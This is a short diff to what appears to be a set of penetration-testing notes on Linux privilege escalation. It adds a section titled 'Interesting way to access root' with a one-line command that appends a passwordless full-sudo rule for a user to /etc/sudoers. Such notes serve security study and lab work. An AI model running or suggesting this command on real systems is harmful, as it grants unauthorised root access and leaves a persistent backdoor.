@@ -275,3 +275,9 @@ References:
 - [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)
 
 ----------------------------------------
+
+### Interesting way to access root
+
+- Add your user to the `/etc/sudoers` file and grant power to execute all commands
+
+   echo "<user> ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
